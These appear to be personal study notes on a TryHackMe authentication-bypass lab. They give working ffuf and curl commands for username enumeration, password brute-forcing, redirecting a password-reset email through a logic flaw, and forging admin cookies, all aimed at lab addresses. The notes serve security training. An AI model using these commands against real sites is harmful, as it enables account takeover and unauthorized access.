# Room
https://tryhackme.com/room/authenticationbypass

# Task 1 - Intro
Intro

# Task 2 - Username Enumeration with ffuf
1. Enumeration
   * You can use the exsitence of an error message telling you a user exists to enumerate users
2. Enumeration Tools
   * ffuf - fuzz faster you fool
     * a web fuzzer written in Go
     * example
        ```
        ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.54/customers/signup -mr "username already"
        ```
      * https://github.com/ffuf/ffuf
      * ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt : define the wordlist
      * -X POST : HTTP method to use
      * -d "username=FUZZ&email=x&password=x&cpassword=x" : data to be used in the POST, FUZZ is the variable that will be replaced from the wordlist
      * -H "Content-Type: application/x-www-form-urlencoded" : header to pass in your fuzzing
      * -u http://10.10.88.54/customers/signup : URL to tickle
      * -mr "username already" : "mr" = match regular expression, match the phrase "username already" and print the results

# Task 3 - Brute Forcing with ffuf
1. Brute force
   * Using the valid usernames from the previous task, you can use a wordlist to attack them, ffuf to the rescue
   * example
    ```
    ffuf -w users3.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.88.54/customers/login -fc 200
    ```
   * ffuf -w users3.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 : map a user list to the variable W1, and a wordlist to the variable W2
   * -X POST : HTTP method to use
   * -d "username=W1&password=W2" : data to be use din the POST, W1 variable is filled in with a username, W2 variable is filled in from the wordlist
   * -H "Content-Type: application/x-www-form-urlencoded" : header to pass in your fuzzing
   * -u http://10.10.88.54/customers/login : URL to fuzz
   * -fc 200 : "fc" = filter code, filter status code 200 from being displayed, show all others
   * side note - my initial user input file wasn't clean text, use cat file | xxd to find binary characters

# Task 4 - Logic Flaws
1. Logic Flaws
   * Occur when the designed flow of the application is circumvented
   * example : use curl to modify a password reset POST request to send to another email address instead of the one on file for a user
   ```
   curl 'http://10.10.38.12/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm'
   ```
   * curl 'http://10.10.38.12/customers/reset?email=robert%40acmeitsupport.thm' : password reset form URL
   * -H 'Content-Type: application/x-www-form-urlencoded' : header to pass that ensures your posted data is encoded properly
     * https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST
   * -d 'username=robert&email=test@customer.acmeitsupport.thm' : data to post, originally it only included the username part which would then send the reset request to the user's email on file, but because of a logic flaw you are able to use the & parameter and tack on another email and send that reset to an email of your choosing

# Task 5 - Cookie Tampering
1. Editing cookies allow unauthenticated access, other privileges, or access to other accounts.
   * example : use a simple plaintext cookie to change authentication and access
   ```
   curl http://10.10.38.12/cookie-test

   curl http://10.10.38.12/cookie-test -H "Cookie: logged_in=true; admin=false"

   curl http://10.10.38.12/cookie-test -H "Cookie: logged_in=true; admin=true"
   ```
2. Cookie encoding
   * Most cookies are not plaintext, they are encoded or hashed using md5, sha, or base64, among others
     * tool: https://gchq.github.io/CyberChef/